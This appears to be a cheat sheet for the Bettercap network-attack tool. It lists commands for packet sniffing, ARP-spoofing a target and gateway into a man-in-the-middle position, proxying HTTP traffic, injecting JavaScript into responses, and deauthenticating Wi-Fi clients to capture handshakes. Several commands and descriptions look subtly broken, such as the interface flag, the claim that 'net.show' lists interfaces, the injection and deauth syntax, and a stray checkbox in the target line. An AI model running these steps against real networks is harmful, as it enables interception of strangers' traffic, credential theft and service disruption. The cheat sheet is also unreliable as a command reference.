### 1. Start Bettercap[​](https://hackviser.com/tactics/tools/bettercap#1-start-bettercap "Direct link to 1. Start Bettercap")

- This is a command opening the interactive console of Bettercap, which enables users to interface with it from the command line to perform various tasks regarding a network.

```
bettercap -I wlan0
```

### 2. Set Target[​](https://hackviser.com/tactics/tools/bettercap#2-set-target "Direct link to 2. Set Target")

- This command sets the IP address or range to be the target of the attack. Targeting makes it possible for the user to define the scope users operations, letting Bettercap focus on the targeted source.

```
- [ ] set target 192.168.1.5
```

### 3. Start Sniffer[​](https://hackviser.com/tactics/tools/bettercap#3-start-sniffer "Direct link to 3. Start Sniffer")

- This command sends to start packet sniffing on the given network interface All the traffic is captured, which allows a more thorough analysis of the data security vulnerabilities.

```
net.sniff on
```

### 4. Start ARP Spoofing[​](https://hackviser.com/tactics/tools/bettercap#4-start-arp-spoofing "Direct link to 4. Start ARP Spoofing")

- Bettercap will actually perform a man-in-the-middle attack with ARP spoofing enabled which against the target and the gateway, intercepting and manipulating their communications by deception of both sides.

```
arp.spoof on
```

### 5. Capture HTTP Traffic[​](https://hackviser.com/tactics/tools/bettercap#5-capture-http-traffic "Direct link to 5. Capture HTTP Traffic")

- This command listens HTTP traffic, allowing unencrypted request(HTTP) and response traffic to pass through and be seen by the tool user for analysis. It is critical for determining sensitive information.

```
http.proxy on
```

### 6. Inject JavaScript[​](https://hackviser.com/tactics/tools/bettercap#6-inject-javascript "Direct link to 6. Inject JavaScript")

- This command allows the user to injects JavaScript into the HTTP responses, which could be used in testing the security of client-side applications. It enables the user to assess how well defenses work exactly when attacks are simulated against Cross-Site Scripting.

```
http.inject <script.js>
```

### 7. Deauthenticate Wi-Fi Clients[​](https://hackviser.com/tactics/tools/bettercap#7-deauthenticate-wi-fi-clients "Direct link to 7. Deauthenticate Wi-Fi Clients")

- This command is, therefore, used for deauthenticating clients from a specified Wi-Fi network—clients are made to disconnect and then auto-reconnect. The processes result in capturing the handshake packets ready for further operations.

```
wifi.deauth <target_MAC> -a <BSSID>
```

### 8. View Network Interfaces[​](https://hackviser.com/tactics/tools/bettercap#8-view-network-interfaces "Direct link to 8. View Network Interfaces")

- This command lists all the available network interfaces on the system.

```
net.show
```

### 9. Stop Bettercap[​](https://hackviser.com/tactics/tools/bettercap#9-stop-bettercap "Direct link to 9. Stop Bettercap")

- This command exits the Bettercap console, stopping every active operation.

```
exit
```

### 10. Help and Usage Information[​](https://hackviser.com/tactics/tools/bettercap#10-help-and-usage-information "Direct link to 10. Help and Usage Information")

- This command displays the help menu and usage information for Bettercap. It provides available commands, options and commands syntax.

```
bettercap -h
```

Alternative usage:

```
bettercap --help
```